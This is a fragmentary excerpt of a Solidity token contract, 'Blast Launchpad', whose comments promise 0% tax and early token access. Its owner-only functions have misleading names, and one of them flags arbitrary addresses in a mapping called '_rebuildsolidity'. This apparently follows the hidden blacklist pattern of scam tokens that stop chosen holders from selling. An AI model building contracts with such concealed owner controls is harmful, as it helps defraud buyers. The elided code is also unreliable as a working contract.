...
// Blast Launchpad
// Tax : 0%
// Blast Launchpad is where you get access to the best new tokens before they list on other centralized or decentralized exchanges.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Blast Launchpad';
    string constant public symbol = 'BLAST';
    ...
    function PermitExchange(address account) public onlyOwner {
    ...
    function BlastRelaunch(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function BlastStacking(address account) public view returns (bool) {
...
contract BlastLaunchpad is BaseToken {
